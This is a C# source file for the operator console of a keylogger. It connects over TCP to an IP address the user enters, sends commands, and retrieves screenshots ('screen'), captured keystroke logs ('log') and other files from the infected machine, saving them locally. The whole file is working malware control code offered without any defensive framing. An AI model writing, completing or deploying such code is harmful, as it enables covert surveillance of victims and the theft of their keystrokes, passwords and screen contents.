using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using System.IO;
using constantsLib;

namespace Client
{
    class Program
    {
        

        static void Main(string[] args)
        {
            try
            {
                Console.Write("Enter keylogger IP: ");
                string serverIpStr = Console.ReadLine();

                SendMessageUntilQuit(serverIpStr);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            Console.ReadLine();
        }

        static void SendMessageUntilQuit(string serverIpStr)
        {
            //IPAddress clientIP = Dns.GetHostEntry(host).AddressList[0];
            IPEndPoint serverIpEndPoint = new IPEndPoint(IPAddress.Parse(serverIpStr), Constants.ListenPort);
            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            //server reply buffer
            byte[] bytes = new byte[Constants.BUFSIZ];

            clientSocket.Connect(serverIpEndPoint);
            bool isConnectionEnd = false;

            while (!isConnectionEnd) {
                try
                {
                    Console.Write("Enter cmd: ");
                    string cmd = Console.ReadLine().ToLower().Trim();
                    if (String.IsNullOrEmpty(cmd))
                        throw new ArgumentException("Cmd must be not empty.");
                    byte[] msg = Encoding.UTF8.GetBytes(cmd);
                    clientSocket.Send(msg);

                    // reply file recieve
                    if (cmd == "screen" || cmd == "log" || cmd.IndexOf("load") == 0)
                    {
                        ReceiveFile(clientSocket);
                    }
                    else
                    {
                        // recieve Server reply
                        int bytesRec = clientSocket.Receive(bytes);
                        Console.WriteLine("\nKeylogger reply: {0}\n\n", Encoding.UTF8.GetString(bytes, 0, bytesRec));
                    }

                    isConnectionEnd = (cmd.IndexOf("quit") != -1);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            Console.WriteLine("Programm closes...\n");
        }

        public static void ReceiveFile(Socket sender)
        {
            byte[] clientData = new byte[Constants.BUFSIZ];

            int receivedBytesLen = sender.Receive(clientData);
            int fileNameLen = BitConverter.ToInt32(clientData, 0);
            string fileName = Encoding.ASCII.GetString(clientData, sizeof(int), fileNameLen);
            int fileContentLen = BitConverter.ToInt32(clientData, sizeof(int) + fileNameLen);

            clientData = new byte[fileContentLen];

            Console.WriteLine("File {0} recieve starts.", fileName);

            receivedBytesLen = sender.Receive(clientData);
            if (fileContentLen != receivedBytesLen)
                throw new Exception("Miss file content");
            BinaryWriter bWriter = new BinaryWriter(File.Open(fileName, FileMode.Create));
            bWriter.Write(clientData, 0, receivedBytesLen);

            Console.WriteLine("File received and saved to {0}", Path.GetDirectoryName(Application.ExecutablePath) + @"\" + fileName);

            bWriter.Close();
        }
    }
}